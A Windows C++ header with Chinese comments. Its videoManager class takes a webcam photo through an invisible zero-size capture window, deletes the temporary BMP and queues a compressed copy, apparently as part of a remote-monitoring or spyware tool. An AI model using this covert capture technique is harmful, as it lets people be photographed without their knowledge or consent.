#pragma once
#include "pch.h"
#include <string> 
#include<WINDOWSX.H>
#include<windows.h>

#include "mStruct.cpp"
#include "ThreadSafeQueue.cpp"
//视频
#include <vfw.h>
#pragma comment( lib, "vfw32.lib" ) 

#include "zlib/zlib.h"
#pragma comment(lib, "./zlib/zlibstat.lib")
using namespace std;

class videoManager {

public:
	static ThreadSafeQueue<mvideo> videoQueue;
	//拍照
	void takePhoto()
	{

		HWND videohwnd = capCreateCaptureWindow(NULL, WS_POPUP, 0, 0, 0, 0, 0, 0);

		 //window name if pop-up // window style // window position and dimensions//hwndParent child ID
		BOOL bRet = FALSE;
		char lpszName[1000], lpszVer[500];
		int i;
		for (i = 0; i < 10 && !bRet; i++)
		{
			bRet = capGetDriverDescription(i, lpszName, sizeof(lpszName), lpszVer, sizeof(lpszVer));
		}//获取摄像头的序号
		int cameraIndex = i - 1;
		if (FALSE == capDriverConnect(videohwnd, cameraIndex)) {//连接摄像头
			//cout << "connect error"<< i << endl;
			return ;
		}

		capPreview(videohwnd, TRUE);//预览
		string fileName = randBmpName();
		capFileSaveDIB(videohwnd, TEXT(fileName.c_str()));//保存图片 不知道怎么保存到内存
		//printf("%s\n", fileName.c_str());s
		capDriverDisconnect(videohwnd);
		//CloseHandle(videohwnd);
		::SendMessage(videohwnd, WM_CLOSE, 0, 0);
		FILE *pFile;
		pFile = fopen(fileName.c_str(), "rb");
		if (pFile == NULL) {
			return ;
		}
		fseek(pFile, 0, SEEK_END);
		unsigned long bmpSize = ftell(pFile);
		unsigned long bmpZipSize = bmpSize;
		rewind(pFile);

		/* 分配内存存储整个文件 */
		byte *bmpMem = new byte[bmpSize];
		fread(bmpMem, 1, bmpSize, pFile);
		fclose(pFile);
		remove(fileName.c_str());//删除文件

		byte *bmpZipMem = new byte[bmpSize];
		compress(bmpZipMem, &bmpZipSize, bmpMem, bmpSize);
		delete bmpMem;
		bmpMem = nullptr;
		mvideo tmp;
		tmp.bmpSize = bmpSize;
		tmp.bmpZipSize = bmpZipSize;
		tmp.bmpZipMem = bmpZipMem;
		videoQueue.push(tmp);

	}

	string randBmpName() {
		char TempFilePath[MAX_PATH];
		GetTempPath(sizeof(TempFilePath), TempFilePath);
		char tmp[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

		char BmpName[20];
		int k;
		for (int i = 0; i < 15; i++)
		{
			k = rand();
			BmpName[i] = tmp[k % (sizeof(tmp) - 1)];
		}
		BmpName[15] = '.';
		BmpName[16] = 'b';
		BmpName[17] = 'm';
		BmpName[18] = 'p';
		BmpName[19] = 0x00;
		return strcat(TempFilePath, BmpName);

	}

};